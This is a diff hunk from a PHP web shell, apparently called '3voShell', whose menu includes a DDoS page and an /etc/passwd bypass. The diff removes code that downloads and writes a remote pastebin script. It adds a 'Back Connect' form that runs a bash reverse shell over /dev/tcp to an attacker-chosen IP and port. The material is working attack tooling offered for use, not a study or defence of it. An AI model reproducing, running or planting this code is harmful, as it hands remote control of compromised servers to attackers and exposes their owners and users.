@@ -3553,14 +3553,17 @@ Your IP: <font color="Lavender"><b><?php echo $my_ip; ?></b></font>�(Don't DoS
 	echo "<iframe src='alx_ddos/ddos.html' width='100%' height='100%' frameborder='0' scrolling='yes'></iframe>";
 
     } elseif($_GET['do'] == 'network') {
-	$network_dir = mkdir('3voShell', 0755);    	
-	$file_network = "3voShell/mainten.html";
-	$network_script = getsource("http://pastebin.com/raw/5uzVYhhZ");
-	$network = fopen($file_network, "w");
-	fwrite($network, $network_script);
-	fclose($network);
-	chmod($file_network, 0444);
-	echo "<iframe src='3voShell/mainten.html' width='100%' height='50%' frameborder='0' scrolling='yes'></iframe>";	
+    echo "<center><form method='post'>
+    Back Connect: <br>
+    <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'><br>
+    <input type='text' placeholder='port' name='port_bc' value='6969'><br>
+    <input type='submit' name='sub_bc' value='Reverse' style='width: 210px;'>
+    </form>";
+    if(isset($_POST['sub_bc'])) {
+        $ip = $_POST['ip_bc'];
+        $port = $_POST['port_bc'];
+        exe("/bin/bash -i >& /dev/tcp/$ip/$port 0>&1");
+    }	
 	
 }elseif($_GET['do'] == 'passbpass') {
 	echo '<center>Bypass etc/passw With:<br>
